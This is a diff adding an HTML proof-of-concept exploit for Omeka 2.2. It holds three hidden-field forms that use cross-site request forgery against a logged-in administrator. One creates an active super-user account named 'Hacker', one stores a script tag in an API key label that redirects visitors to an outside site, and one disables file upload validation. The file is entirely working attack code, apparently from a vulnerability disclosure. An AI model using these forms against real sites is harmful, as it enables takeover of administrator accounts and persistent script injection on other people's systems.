@@ -1,0 +1,42 @@
+<html>
+<title>Omeka 2.2 CSRF And Stored XSS Vulnerability</title>
+<body>
+
+<!-- CSRF Add Super User & Activate -->
+<!-- Roles: Super, Admin, Researcher, Contributor -->
+
+<form action="http://www.example.com/omeka-2.2/admin/users/add" 
+method="POST">
+<input type="hidden" name="username" value="Hacker" />
+<input type="hidden" name="name" value="CSRF" />
+<input type="hidden" name="email" value="lab@zeroscience.mk" />
+<input type="hidden" name="role" value="super" />
+<input type="hidden" name="active" value="1" />
+<input type="hidden" name="submit" value="Add+User" />
+<input type="submit" value="Add Super User" />
+</form>
+
+
+<!-- CSRF Add Persistent XSS -->
+
+<form action="http://www.example.com/omeka-2.2/admin/users/api-keys/1" 
+method="POST">
+<input type="hidden" name="api_key_label" 
+value='<script>location.href="http://www.zeroscience.mk"</script>' />
+<input type="hidden" name="update_api_keys" value="Update+API+Keys" />
+<input type="submit" value="Insert Script" />
+</form>
+
+
+<!-- CSRF Disable File Validation -->
+
+<form 
+action="http://www.example.com/omeka-2.2/admin/settings/edit-security" 
+method="POST">
+<input type="hidden" name="disable_default_file_validation" value="1" />
+<input type="hidden" name="submit" value="Save+Changes" />
+<input type="submit" value="Disable File Validation" />
+</form>
+
+</body>
+</html> 
